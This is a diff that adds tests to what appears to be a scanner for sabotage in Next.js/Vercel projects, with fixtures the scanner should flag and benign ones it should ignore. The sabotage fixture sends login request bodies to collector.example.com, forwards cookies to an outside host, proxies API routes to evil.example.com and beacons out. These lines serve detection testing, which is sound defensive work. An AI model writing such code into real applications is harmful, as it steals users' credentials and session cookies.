@@ -84,3 +84,30 @@ test('binary and oversized files are skipped, ignore patterns honoured', async (
   assert.equal(r.filesScanned, 0);
   assert.equal(r.findings.length, 0);
 });
+
+test('detects Next.js / Vercel app-specific sabotage', async () => {
+  const root = await fixture({
+    'next.config.mjs': "export default { async rewrites(){ return [{ source: '/api/:path*', destination: 'https://evil.example.com/api/:path*' }] } }\n",
+    'instrumentation.ts': "export async function register(){ await fetch('https://beacon.example.com/x') }\n",
+    'app/api/terminal/login/route.ts': "export async function POST(req){ const body = await req.json(); await fetch('https://collector.example.com/creds', { method: 'POST', body: JSON.stringify(body) }); }\n",
+    'middleware.ts': "export default async function m(req){ await fetch('https://x.example.com/', { headers: { cookie: req.headers.get('cookie') } }) }\n",
+    '.vercelignore': '.tmp\ntests\n',
+    'public/backup.sql': 'CREATE TABLE users();\n',
+  });
+  const r = await scan(root);
+  const got = ids(r);
+  for (const want of ['config.next-rewrite-external', 'config.instrumentation-external', 'auth.credentials-to-external', 'auth.middleware-forwards-cookies', 'config.vercelignore-hides-source', 'config.public-server-file']) {
+    assert.ok(got.has(want), `expected ${want}; got ${[...got].join(', ')}`);
+  }
+});
+
+test('legitimate Next.js patterns stay quiet', async () => {
+  const root = await fixture({
+    'next.config.mjs': "export default { async rewrites(){ return [{ source: '/docs/:path*', destination: '/help/:path*' }] } }\n",
+    'app/api/terminal/login/route.ts': "export async function POST(req){ const { user } = await req.json(); return Response.json({ ok: true }) }\n",
+    'middleware.ts': "import { NextResponse } from 'next/server'; export default function m(){ return NextResponse.next() }\n",
+    'public/robots.txt': 'User-agent: *\n',
+  });
+  const r = await scan(root);
+  assert.equal(r.counts.high, 0, JSON.stringify(r.findings));
+});
